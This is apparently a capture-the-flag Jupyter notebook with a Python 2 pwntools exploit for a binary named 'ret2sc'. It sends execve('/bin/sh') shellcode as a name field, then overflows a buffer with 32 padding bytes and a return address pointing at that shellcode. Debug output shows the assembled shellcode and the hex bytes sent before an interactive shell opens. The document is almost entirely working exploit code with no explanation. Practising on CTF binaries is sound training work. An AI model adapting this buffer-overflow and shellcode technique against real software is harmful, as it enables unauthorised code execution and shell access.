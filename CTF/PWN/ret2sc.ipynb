{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: TERMINFO=/usr/share/terminfo\n",
      "env: PWNLIB_NOTERM=true\n"
     ]
    }
   ],
   "source": [
    "%env TERMINFO=/usr/share/terminfo\n",
    "%env PWNLIB_NOTERM=true"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Starting local process './ret2sc' argv=['ret2sc'] \n",
      "[+] Starting local process './ret2sc' argv=['ret2sc'] : pid 27232\n",
      "[DEBUG] cpp -C -nostdinc -undef -P -I/usr/local/lib/python2.7/dist-packages/pwnlib/data/includes /dev/stdin\n",
      "[DEBUG] Assembling\n",
      "    .section .shellcode,\"awx\"\n",
      "    .global _start\n",
      "    .global __start\n",
      "    _start:\n",
      "    __start:\n",
      "    .intel_syntax noprefix\n",
      "        /* execve(path='/bin///sh', argv=['sh'], envp=0) */\n",
      "        /* push '/bin///sh\\x00' */\n",
      "        push 0x68\n",
      "        push 0x732f2f2f\n",
      "        push 0x6e69622f\n",
      "        mov ebx, esp\n",
      "        /* push argument array ['sh\\x00'] */\n",
      "        /* push 'sh\\x00\\x00' */\n",
      "        push 0x1010101\n",
      "        xor dword ptr [esp], 0x1016972\n",
      "        xor ecx, ecx\n",
      "        push ecx /* null terminate */\n",
      "        push 4\n",
      "        pop ecx\n",
      "        add ecx, esp\n",
      "        push ecx /* 'sh\\x00' */\n",
      "        mov ecx, esp\n",
      "        xor edx, edx\n",
      "        /* call execve() */\n",
      "        push 11 /* 0xb */\n",
      "        pop eax\n",
      "        int 0x80\n",
      "[DEBUG] /usr/bin/x86_64-linux-gnu-as -32 -o /tmp/pwn-asm-an_giL/step2 /tmp/pwn-asm-an_giL/step1\n",
      "[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-an_giL/step3 /tmp/pwn-asm-an_giL/step4\n",
      "[DEBUG] Received 0x5 bytes:\n",
      "    'Name:'\n",
      "[DEBUG] Sent 0x2d bytes:\n",
      "    00000000  6a 68 68 2f  2f 2f 73 68  2f 62 69 6e  89 e3 68 01  │jhh/│//sh│/bin│··h·│\n",
      "    00000010  01 01 01 81  34 24 72 69  01 01 31 c9  51 6a 04 59  │····│4$ri│··1·│Qj·Y│\n",
      "    00000020  01 e1 51 89  e1 31 d2 6a  0b 58 cd 80  0a           │··Q·│·1·j│·X··│·│\n",
      "    0000002d\n",
      "[DEBUG] Received 0xe bytes:\n",
      "    'Try your best:'\n",
      "[DEBUG] Sent 0x25 bytes:\n",
      "    00000000  62 62 62 62  62 62 62 62  62 62 62 62  62 62 62 62  │bbbb│bbbb│bbbb│bbbb│\n",
      "    *\n",
      "    00000020  60 a0 04 08  0a                                     │`···│·│\n",
      "    00000025\n",
      "[*] Switching to interactive mode\n"
     ]
    }
   ],
   "source": [
    "# -*- coding: utf-8 -*-\n",
    "#!/usr/bin/env python2\n",
    "from pwn import *\n",
    "context.log_level = 'debug'\n",
    "context.arch = 'x86' #amd64,x86\n",
    "LOCAL = True\n",
    "if LOCAL:\n",
    "    p = process('ret2sc')\n",
    "else:\n",
    "    p = remote('127.0.0.1',10001)\n",
    "\n",
    "def main():\n",
    "    #name = 'aaaa';\n",
    "    name = asm(shellcraft.sh());\n",
    "    #payload = 'bbb';\n",
    "    payload = 'b'*32+p32(0x0804A060);\n",
    "    p.recvuntil('Name:')\n",
    "    p.sendline(name)\n",
    "    p.recvuntil('best:')\n",
    "    p.sendline(payload)\n",
    "    p.interactive()\n",
    "\n",
    "if __name__ == '__main__':\n",
    "    \n",
    "    main()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 2",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.15+"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
